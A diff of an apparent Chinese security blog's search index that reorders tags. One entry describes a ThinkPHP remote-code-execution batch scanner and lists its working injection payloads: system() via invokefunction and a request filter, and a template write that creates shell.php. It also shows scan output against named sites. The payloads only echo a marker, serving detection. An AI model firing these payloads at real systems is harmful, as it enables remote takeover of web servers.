@@ -18,8 +18,8 @@
     <url>%2FthinkPHPBatchPoc.html</url>
     <content type="text"><![CDATA[123456789PS E:\vulW3b&gt; python .\thinkPHPBatchPoc.pythinkPHPBatchPocAuthor: Admintony @ 2018.12.13Blog: http://www.admintony.com免责声明: 脚本仅用于批量检测站点是否存在漏洞，请勿用于非法用途，否则作者不担负任何责任。usage:thinkPHPBatchPoc.py -f target.txt # 批量检测是否存在thinkPHP代码执行漏洞thinkPHPBatchPoc.py -u target_URL # 指定检测是否存在thinkPHP代码执行漏洞 thinkPHPBatchPocthinkPHPBatchPoc 是thinkPHP代码执行批量检测工具 工具所使用的payload123456789?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com?s=index/\think\Request/input&amp;filter=system&amp;data=echo%20www_admintony_com?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20echo%20www_admintony_com;?%3E?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20echo%20"www_admintony_com";?%3E 工具使用方法123456789PS E:\PyProject&gt; python .\thinkPHPBatchPoc.pythinkPHPBatchPocAuthor: Admintony @ 2018.12.13Blog: http://www.admintony.com免责声明: 脚本仅用于批量检测站点是否存在漏洞，请勿用于非法用途，否则作者不担负任何责任。usage:thinkPHPBatchPoc.py -f target.txt # 批量检测是否存在thinkPHP代码执行漏洞thinkPHPBatchPoc.py -u target_URL # 指定检测是否存在thinkPHP代码执行漏洞 针对单个目标进行测试123PS E:\PyProject&gt; python .\thinkPHPBatchPoc.py -u admintony.com[+] http://admintony.com is vulnerable[+] Payload is ?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com 批量测试12345678910PS E:\PyProject&gt; python .\thinkPHPBatchPoc.py -f .\target.txt[+]Testing http://www.admintony.com[-] http://www.admintony.com is not vulnerable[+]Testing http://baidu.com[-] http://baidu.com is not vulnerable[+]Testing vulW3b.admintony.com/[+] http://vulW3b.admintony.com/ is vulnerable[+] Payload is ?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com 下载地址thinkPHPBatchPoc]]></content>
       <tags>
-        <tag>代码执行</tag>
         <tag>thinkPHP</tag>
+        <tag>代码执行</tag>
       </tags>
   </entry>
   <entry>
@@ -381,8 +381,8 @@
         <category>ACCESS自动注入工具</category>
       </categories>
       <tags>
-        <tag>access注入</tag>
         <tag>Python</tag>
+        <tag>access注入</tag>
       </tags>
   </entry>
   <entry>
@@ -394,8 +394,8 @@
         <category>越权</category>
       </categories>
       <tags>
-        <tag>西华升腾</tag>
         <tag>越权</tag>
+        <tag>西华升腾</tag>
         <tag>数据泄露</tag>
       </tags>
   </entry>
@@ -500,8 +500,8 @@
         <category>MySQL写shell</category>
       </categories>
       <tags>
-        <tag>提权</tag>
         <tag>越权</tag>
+        <tag>提权</tag>
         <tag>getshell</tag>
       </tags>
   </entry>
@@ -723,8 +723,8 @@
       </categories>
       <tags>
         <tag>渗透测试</tag>
-        <tag>MySQL提权</tag>
         <tag>提权</tag>
+        <tag>MySQL提权</tag>
       </tags>
   </entry>
   <entry>
